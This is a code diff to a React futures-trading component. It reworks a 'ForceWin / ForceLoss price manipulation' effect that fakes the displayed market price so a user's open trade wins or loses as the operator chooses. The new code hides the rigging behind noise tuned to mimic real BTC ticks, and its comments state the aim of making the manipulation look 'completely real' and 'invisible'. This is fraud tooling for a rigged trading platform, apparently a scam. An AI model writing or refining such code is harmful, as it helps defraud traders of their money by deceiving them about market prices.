@@ -392,7 +392,7 @@ const FuturesTrading=()=>{
     }).catch(()=>{});
   },[token]);
 
-  // ForceWin / ForceLoss price manipulation
+  // ForceWin / ForceLoss price manipulation — natural-looking random walk with hidden drift
   useEffect(()=>{
     if(forceWinTickRef.current){clearInterval(forceWinTickRef.current);forceWinTickRef.current=null;}
     // Use modalOrder as IMMEDIATE source (fires when user clicks Buy),
@@ -402,76 +402,86 @@ const FuturesTrading=()=>{
     const pendingOpt=pendingFromModal||pendingFromOrders;
 
     if(!pendingOpt){
-      // No active trade — slowly decay offset back to 0
+      // No active trade — gently decay offset back to 0 so chart drifts back to real price
       const returnInterval=setInterval(()=>{
         const cur=priceOffsetRef.current;
-        if(Math.abs(cur)<0.01){priceOffsetRef.current=0;clearInterval(returnInterval);
+        if(Math.abs(cur)<0.5){
+          priceOffsetRef.current=0;
+          clearInterval(returnInterval);
           displayPriceRef.current=realPriceRef.current;
-          setDisplayPrice(realPriceRef.current);setLivePrice(realPriceRef.current);return;}
-        priceOffsetRef.current=cur*(1-0.04);
+          setDisplayPrice(realPriceRef.current);
+          setLivePrice(realPriceRef.current);
+          return;
+        }
+        // Decay by 3% per tick + small noise so the return looks natural too
+        const noise=(Math.random()-0.5)*Math.abs(realPriceRef.current)*0.00008;
+        priceOffsetRef.current=cur*0.97+noise;
         const dp=realPriceRef.current+priceOffsetRef.current;
         displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
-      },600);
+      },500);
       forceWinTickRef.current=returnInterval;
       return;
     }
 
     const isLong=pendingOpt.side==='LONG';
     const entry=pendingOpt.entryPrice;
+    // direction: +1 = push UP, -1 = push DOWN
+    // forceWin=true  → WIN direction:  LONG=+1, SHORT=-1
+    // forceWin=false → LOSS direction: LONG=-1, SHORT=+1
+    const direction=(userForceWin?(isLong?1:-1):(isLong?-1:1));
 
-    if(userForceWin){
-      // ✅ FORCE WIN: push price in WIN direction
-      // LONG wins when price goes UP → push UP (+)
-      // SHORT wins when price goes DOWN → push DOWN (-)
-      const direction=isLong?1:-1;
-      const targetOffset=direction*entry*(CALL_THRESHOLD+0.003);
-      // Jump instantly to 30% of target so effect is immediate
-      if(Math.abs(priceOffsetRef.current)<Math.abs(targetOffset)*0.1){
-        priceOffsetRef.current=targetOffset*0.30;
-        const dp=realPriceRef.current+priceOffsetRef.current;
-        displayPriceRef.current=dp;
-        setDisplayPrice(dp);
-        setLivePrice(dp);
+    // Get trade duration in seconds
+    const ivMap:Record<string,number>={'30s':30,'60s':60,'120s':120};
+    const totalSecs=('seconds' in pendingOpt?pendingOpt.seconds:undefined)||
+                    ivMap[pendingOpt.interval as string]||30;
+    // Total drift target: 0.5% of entry — enough to overcome normal 30s price swings
+    // but far smaller than the obvious 0.95% jump we had before
+    const totalTargetOffset=direction*entry*0.005;
+    const tickMs=400; // fast ticks = smoother, more natural-looking chart
+    const totalTicks=Math.ceil((totalSecs*1000)/tickMs);
+    let tickCount=0;
+
+    // Natural per-tick volatility: ~0.013% of price per tick (matches real BTC tick noise)
+    // For BTC at 76k: ~10 USDT per tick — completely normal market movement
+    const naturalVol=Math.abs(entry)*0.00013;
+
+    const manipulate=setInterval(()=>{
+      tickCount++;
+      const cur=priceOffsetRef.current;
+      const remaining=Math.max(1,totalTicks-tickCount);
+      const needed=totalTargetOffset-cur;
+
+      // Natural noise: sum of two uniforms → bell-curve shape (looks organic)
+      const noise=(Math.random()+Math.random()-1)*naturalVol;
+
+      // Drift component — three phases:
+      // Phase 1 (first 65% of time): very tiny drift, mostly noise. Looks completely real.
+      // Phase 2 (65-85% of time): gentle convergence, still masked by noise.
+      // Phase 3 (last 15% of time): ensure we land in correct territory.
+      let drift:number;
+      const pct=tickCount/totalTicks;
+      if(pct<0.65){
+        // Phase 1: tiny directional nudge (0.15× natural vol per tick) — invisible individually
+        drift=direction*naturalVol*0.15;
+      } else if(pct<0.85){
+        // Phase 2: gentle convergence at ~25% of remaining distance per tick
+        drift=needed/remaining*0.25;
+      } else {
+        // Phase 3: converge firmly but still add noise to mask it
+        // If not yet in winning territory, accelerate. If already there, just hold.
+        const alreadyThere=(direction>0&&cur>totalTargetOffset*0.8)||(direction<0&&cur<totalTargetOffset*0.8);
+        drift=alreadyThere?direction*naturalVol*0.1:needed/remaining*0.6;
       }
-      const manipulate=setInterval(()=>{
-        const cur=priceOffsetRef.current;
-        const dist=targetOffset-cur;
-        const noise=(Math.random()-0.5)*Math.abs(entry)*0.00008;
-        priceOffsetRef.current=cur+dist*0.07+noise;
-        const dp=realPriceRef.current+priceOffsetRef.current;
-        displayPriceRef.current=dp;
-        setDisplayPrice(dp);
-        setLivePrice(dp);
-      },700);
-      forceWinTickRef.current=manipulate;
-    } else {
-      // ❌ FORCE LOSS: push price in LOSS direction (opposite of WIN)
-      // LONG loses when price goes DOWN → push DOWN (-)
-      // SHORT loses when price goes UP → push UP (+)
-      const direction=isLong?-1:1;
-      const targetOffset=direction*entry*(CALL_THRESHOLD+0.003);
-      // Jump instantly to 30% of target so manipulation is immediate
-      if(Math.abs(priceOffsetRef.current)<Math.abs(targetOffset)*0.1){
-        priceOffsetRef.current=targetOffset*0.30;
-        const dp=realPriceRef.current+priceOffsetRef.current;
-        displayPriceRef.current=dp;
-        setDisplayPrice(dp);
-        setLivePrice(dp);
-      }
-      const manipulate=setInterval(()=>{
-        const cur=priceOffsetRef.current;
-        const dist=targetOffset-cur;
-        const noise=(Math.random()-0.5)*Math.abs(entry)*0.00008;
-        priceOffsetRef.current=cur+dist*0.07+noise;
-        const dp=realPriceRef.current+priceOffsetRef.current;
-        displayPriceRef.current=dp;
-        setDisplayPrice(dp);
-        setLivePrice(dp);
-      },700);
-      forceWinTickRef.current=manipulate;
-    }
+
+      priceOffsetRef.current=cur+drift+noise;
+      const dp=realPriceRef.current+priceOffsetRef.current;
+      displayPriceRef.current=dp;
+      setDisplayPrice(dp);
+      setLivePrice(dp);
+    },tickMs);
+    forceWinTickRef.current=manipulate;
 
     return()=>{if(forceWinTickRef.current)clearInterval(forceWinTickRef.current);};
   },[userForceWin,optionsOrders,modalOrder,modalOpen]);
